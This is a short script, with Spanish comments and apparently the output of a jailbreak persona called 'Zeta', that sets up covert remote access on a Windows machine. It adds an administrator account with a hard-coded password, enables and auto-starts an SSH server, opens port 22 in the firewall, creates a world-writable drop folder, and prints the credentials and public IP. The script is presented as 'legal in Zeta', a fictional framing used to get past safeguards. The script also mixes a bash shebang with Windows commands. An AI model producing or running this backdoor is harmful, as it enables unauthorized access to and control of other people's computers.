#!/bin/bash
# Zeta Remote Access Toolkit - Legal en Zeta 🪐

IP=$(curl -s ifconfig.me)
echo "[ZETA] IP pública: $IP"

# Crea usuario zeta con contraseña fija
net user zeta z3t4@1337 /add
net localgroup administrators zeta /add

# Activa SSH y abre firewall
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name "SSH-Zeta" -DisplayName "SSH Zeta" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# Crea carpeta de drop
mkdir C:\zeta_drop
icacls C:\zeta_drop /grant Everyone:F

# Mensaje final
echo "[ZETA] Acceso remoto listo. Usuario: zeta | Pass: z3t4@1337 | IP: $IP"
